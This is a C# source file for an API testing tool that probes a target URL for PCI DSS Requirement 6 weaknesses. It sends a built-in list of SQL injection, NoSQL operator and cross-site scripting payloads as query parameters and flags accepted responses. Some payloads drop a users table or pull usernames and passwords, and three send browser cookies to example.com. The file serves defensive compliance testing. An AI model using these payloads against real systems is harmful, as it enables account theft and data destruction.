namespace API_Tester;

public partial class MainPage
{
    /*
    PCI DSS Requirement 6 – Secure Systems and Software Payloads

    Purpose:
    Provides payloads used to test whether the application properly protects
    systems and software from common injection and input-handling
    vulnerabilities in accordance with PCI DSS Requirement 6.

    Requirement 6 focuses on developing and maintaining secure systems and
    applications by identifying and addressing common attack vectors that
    could compromise cardholder data environments.

    Threat Model:
    If systems are not securely developed or patched, attackers may exploit
    application vulnerabilities to:

        - execute unauthorized commands
        - manipulate backend databases
        - access sensitive system files
        - inject malicious scripts or queries
        - compromise application logic

    These payloads simulate common attack patterns used to exploit insecure
    input handling.

    Common vulnerabilities targeted include:

        - SQL injection
        - command injection
        - cross-site scripting (XSS)
        - path traversal
        - improper input validation

    Test Strategy:
    The payloads returned by this method represent typical malicious inputs
    that may trigger insecure behavior in poorly protected systems. These
    inputs help determine whether the application properly validates,
    sanitizes, and handles untrusted input.

    Potential Impact:
    If secure development controls are weak, attackers may:

        - gain unauthorized system access
        - manipulate application data
        - retrieve sensitive system files
        - compromise payment processing systems
        - exploit vulnerabilities to move laterally within the environment

    Expected Behavior:
    Applications should:

        - enforce strict input validation
        - sanitize and encode untrusted input
        - use parameterized queries for database access
        - prevent execution of injected commands
        - maintain secure coding practices and patch vulnerabilities
    */
    
    private static string[] GetDssReq6SecureSystemsAndSoftwarePayloads() =>
    [
        "' OR 1=1--",
        "\" OR \"1\"=\"1\"--",
        "{\"$ne\":null}",
        "<svg/onload=alert(1)>",
        "'; DROP TABLE users --",
        "' UNION SELECT null, username, password FROM users --",
        "admin' --",
        "' OR 1=1 LIMIT 1 --",
        "<script>alert('XSS')</script>",
        "' AND 1=1 --",
        "1' UNION SELECT null, username, password FROM users --",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<script>document.location='example.com?cookie=' + document.cookie;</script>",
        "1' AND 1=1 UNION SELECT username, password FROM users --",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<svg><script>alert('XSS')</script></svg>",
        "<input type='text' value=''><script>alert(document.cookie)</script>",
        "' OR 1=1 --", 
        "<script>eval('alert(1)')</script>",
        "<script>fetch('http://example.com?cookie=' + document.cookie);</script>",
        "<script>document.write('<img src=\'http://example.com?cookie=' + document.cookie + '\'/>');</script>",
        "<script>setTimeout(() => { alert('XSS') }, 1000);</script>"
    ];

    private HttpRequestMessage FormatDssReq6SecureSystemsAndSoftwareRequest(Uri baseUri, string payload)
    {
        var probeUri = AppendQuery(baseUri, new Dictionary<string, string>
        {
            ["search"] = payload,
            ["filter"] = payload
        });
        return new HttpRequestMessage(HttpMethod.Get, probeUri);
    }

    private async Task<string> RunDssReq6SecureSystemsAndSoftwareTestsAsync(Uri baseUri)
    {
        var payloads = GetDssReq6SecureSystemsAndSoftwarePayloads();
        var findings = new List<string>();
        var accepted = 0;

        foreach (var payload in payloads)
        {
            var response = await SafeSendAsync(() => FormatDssReq6SecureSystemsAndSoftwareRequest(baseUri, payload));
            findings.Add($"Payload '{payload}': {FormatStatus(response)}");
            if (response is not null && (int)response.StatusCode is >= 200 and < 300)
            {
                accepted++;
            }
        }

        findings.Insert(0, $"Payload variants tested: {payloads.Length}");
        findings.Add(accepted > 1
            ? $"Potential risk: insecure software-input handling on {accepted}/{payloads.Length} probes."
            : "No obvious PCI DSS Req.6 input-handling weakness across tested payloads.");

        return FormatSection("PCI DSS Req 6 Secure Systems And Software", baseUri, findings);
    }
}
